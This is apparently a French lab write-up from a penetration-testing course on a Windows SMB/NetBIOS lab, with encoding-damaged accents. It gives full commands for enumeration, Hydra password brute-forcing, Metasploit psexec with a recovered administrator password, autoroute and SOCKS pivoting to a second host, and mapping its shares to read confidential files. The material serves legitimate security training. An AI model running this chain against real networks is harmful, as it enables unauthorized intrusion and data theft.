# üîí Lab NetBIOS/SMB Hacking - Exploitation et Pivoting

[‚Üê Retour aux Labs](README.md) | [‚Üê Table des mati√®res](../README.md)

## üéØ Objectifs du Lab

- Comprendre l'√©num√©ration SMB/NetBIOS
- Exploiter les services SMB Windows
- R√©aliser du pivoting r√©seau avec Metasploit
- Acc√©der aux ressources partag√©es via pivoting

## üèóÔ∏è Architecture du Lab

```
Attaquant (Kali)  ‚Üí  Target 1 (demo.ine.local)  ‚Üí  Target 2 (target2)
                      10.0.19.243                    10.0.28.125
                      Windows Server 2008 R2-2012   Windows (pivot)
```

## üìã M√©thodologie Compl√®te

### Phase 1 : Reconnaissance Initiale

#### V√©rification de connectivit√©
```bash
# Test de connectivit√© vers les cibles
ping -c 5 demo.ine.local
ping -c 5 target2
```

#### Scan de ports initial
```bash
# D√©couverte des services sur la premi√®re cible
nmap demo.ine.local
```

**R√©sultats attendus :**
- Multiples ports ouverts exposant les services Windows core
- SMB (445), RDP, RPC, etc.
- Focus sur le service SMB pour ce lab

### Phase 2 : √ânum√©ration SMB Approfondie

#### Identification des versions de service
```bash
# √ânum√©ration d√©taill√©e des ports SMB
nmap -sV -p 139,445 demo.ine.local
```
- `-sV` : D√©tection de version des services
- `-p 139,445` : Scan sp√©cifique des ports SMB/NetBIOS

**Informations obtenues :**
- OS : Microsoft Windows Server 2008 R2 - 2012
- Services SMB actifs sur ports 139 et 445

#### D√©tection des protocoles SMB
```bash
# Identification des versions de protocole SMB support√©es
nmap -p445 --script smb-protocols demo.ine.local
```

**Contexte technique - Versions SMB :**
- **SMBv1** : Protocole original (ann√©es 1980), extr√™mement vuln√©rable
  - Exploit√© par WannaCry
  - Manque de protections : pas d'int√©grit√© pr√©-authentification, n√©gociation non s√©curis√©e
  - Microsoft recommande fortement sa d√©sactivation
- **SMBv2/3** : Versions modernes avec protections de s√©curit√©
  - Chiffrement, int√©grit√© pr√©-authentification
  - D√©sactivation des connexions guest non s√©curis√©es

#### Analyse du niveau de s√©curit√© SMB
```bash
# √âvaluation de la configuration de s√©curit√© SMB
nmap -p445 --script smb-security-mode demo.ine.local
```

**Points cl√©s identifi√©s :**
- Le script utilise l'utilisateur `guest` par d√©faut
- Utilisateur `guest` pr√©sent sur tous les syst√®mes Windows
- Possibilit√© de d√©finir d'autres utilisateurs avec des credentials valides

### Phase 3 : Test d'Acc√®s Anonyme

#### V√©rification des sessions nulles
```bash
# Test d'acc√®s anonyme avec smbclient
smbclient -L demo.ine.local
# Appuyer sur Entr√©e quand demand√© le mot de passe
```

**Concept - Sessions Nulles :**
Les sessions nulles permettent l'acc√®s anonyme aux ressources SMB sans authentification. C'est une configuration dangereuse mais parfois pr√©sente sur les syst√®mes mal configur√©s.

#### √ânum√©ration des utilisateurs
```bash
# D√©couverte des comptes utilisateurs via nmap
nmap -p445 --script smb-enum-users.nse demo.ine.local
```

### Phase 4 : Attaque par Force Brute

#### Pr√©paration de la liste d'utilisateurs
```bash
# Cr√©er un fichier users.txt avec les utilisateurs d√©couverts
# (bas√© sur les r√©sultats de l'√©num√©ration pr√©c√©dente)
```

#### Bruteforce avec Hydra
```bash
# Attaque par dictionnaire sur le service SMB
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

**R√©sultats typiques :**
- D√©couverte de credentials valides pour `administrator`
- Mot de passe faible identifi√©

### Phase 5 : Exploitation avec PsExec

#### Lancement de Metasploit
```bash
# D√©marrage du framework Metasploit
msfconsole -q
```

#### Configuration du module PsExec
```bash
# Utilisation du module d'ex√©cution de code authentifi√©
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1  # Mot de passe d√©couvert
exploit
```

**Concept - PsExec :**
- Module similaire √† l'utilitaire SysInternals PsExec
- Utilise des credentials d'administrateur valides
- Cr√©e un service avec nom et description al√©atoires
- Permet l'ex√©cution de code arbitraire
- Nettoyage automatique apr√®s exploitation

**R√©sultat :** Obtention d'une session Meterpreter sur la premi√®re cible

### Phase 6 : D√©couverte de la Seconde Cible

#### Test de connectivit√© depuis la cible compromise
```bash
# Passage en shell syst√®me
shell
# Test de ping vers la seconde cible
ping 10.0.28.125
```

**Observation importante :**
- La cible 2 (10.0.28.125) est accessible depuis la cible 1
- La cible 2 N'EST PAS accessible directement depuis Kali
- N√©cessit√© de mettre en place du pivoting

### Phase 7 : Configuration du Pivoting

#### Ajout de route via Meterpreter
```bash
# Retour √† la session Meterpreter
# Ajout de route pour le r√©seau de la cible 2
run autoroute -s 10.0.28.125/20
```

**Concept - Autoroute :**
- Ajoute des routes dans la table de routage Metasploit
- Permet l'acc√®s aux r√©seaux internes via la session compromise
- Essentiel pour le pivoting r√©seau

#### Configuration du serveur SOCKS
```bash
# V√©rification de la configuration proxychains
cat /etc/proxychains4.conf
# Rechercher la ligne socks4 et noter le port (g√©n√©ralement 9050)
```

```bash
# Mise en arri√®re-plan de la session Meterpreter
background

# Configuration du serveur proxy SOCKS4a
use auxiliary/server/socks_proxy
set SRVPORT 9050  # Port configur√© dans proxychains
set VERSION 4a
exploit

# V√©rification des jobs actifs
jobs
```

**Concept - SOCKS Proxy :**
- Serveur proxy int√©gr√© √† Metasploit
- Utilise le routage Metasploit pour relayer les connexions
- Permet l'utilisation d'outils externes via proxychains

### Phase 8 : √ânum√©ration de la Cible Pivot√©e

#### Scan via proxychains
```bash
# Scan de la cible 2 via le pivot
proxychains nmap target2 -sT -Pn -sV -p 445
```

**Param√®tres de scan via pivot :**
- `-sT` : TCP connect scan (plus s√ªr via proxy)
- `-Pn` : Skip host discovery (√©vite les timeouts)
- `-sV` : D√©tection de version
- `-p 445` : Port SMB sp√©cifique

**Pourquoi ce type de scan :**
- Scan TCP connect plus stable via proxy
- √âvite les scans agressifs qui pourraient tuer la session
- Alternative aux modules auxiliaires Metasploit (plus agressifs)

### Phase 9 : Exploitation des Ressources Partag√©es

#### Tentative d'acc√®s initial
```bash
# Retour √† la session Meterpreter
sessions -i 1
shell
# Test d'acc√®s aux ressources partag√©es
net view 10.0.28.125
```

**R√©sultat initial :** `Access is denied`

#### Migration de processus
```bash
# Migration vers un processus utilisateur
migrate -N explorer.exe
shell
# Nouvelle tentative d'acc√®s
net view 10.0.28.125
```

**Concept - Migration de processus :**
- Passage de `NT AUTHORITY\SYSTEM` vers un processus utilisateur
- `explorer.exe` s'ex√©cute dans le contexte de l'utilisateur connect√©
- Permet l'acc√®s aux ressources r√©seau avec les permissions utilisateur

**R√©sultats apr√®s migration :**
- D√©couverte de deux ressources partag√©es : `Documents` et `K$`
- Confirmation que la cible 2 autorise les sessions nulles

#### Mappage des lecteurs r√©seau
```bash
# Mappage des ressources partag√©es
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
```

#### Exploration des donn√©es
```bash
# Exploration du contenu des lecteurs mapp√©s
dir D:
dir K:

# Lecture des fichiers sensibles
cat D:\\Confidential.txt
cat D:\\FLAG2.txt
```

## üîë Points Cl√©s et Le√ßons Apprises

### S√©curit√© SMB/NetBIOS
1. **Versions SMB** : SMBv1 extr√™mement dangereux, d√©sactiver imp√©rativement
2. **Sessions nulles** : Configuration dangereuse permettant l'acc√®s anonyme
3. **Credentials faibles** : Bruteforce efficace sur mots de passe simples
4. **Partages par d√©faut** : `C$`, `ADMIN$` donnent acc√®s syst√®me complet

### Techniques de Pivoting
1. **Autoroute** : Essentiel pour acc√©der aux r√©seaux internes
2. **SOCKS Proxy** : Permet l'utilisation d'outils externes via pivot
3. **Migration de processus** : N√©cessaire pour certains acc√®s r√©seau
4. **Proxychains** : Configuration correcte cruciale pour le fonctionnement

### M√©thodologie d'Attaque
1. **Reconnaissance** ‚Üí **√ânum√©ration** ‚Üí **Exploitation** ‚Üí **Pivoting**
2. **Patience** : Scans via pivot plus lents mais n√©cessaires
3. **Adaptation** : Migration de processus selon les besoins d'acc√®s
4. **Persistance** : Exploration syst√©matique des ressources d√©couvertes

## üõ†Ô∏è Outils Utilis√©s

- **nmap** : Reconnaissance et √©num√©ration ‚Üí [Guide nmap](../07-cheatsheets/quick-commands.md)
- **smbclient** : Test d'acc√®s SMB ‚Üí [Guide SMBClient](../06-tools/smbclient.md)
- **hydra** : Bruteforce credentials ‚Üí [Guide Hydra](../06-tools/hydra.md)
- **metasploit** : Exploitation et pivoting
- **proxychains** : Tunneling via pivot

## üîó R√©f√©rences Compl√©mentaires

- [√ânum√©ration SMB](../03-enumeration/smb-samba.md)
- [Exploitation Windows](../04-exploitation/windows-vulns.md)
- [Post-exploitation Windows](../05-post-exploitation/windows-privesc.md)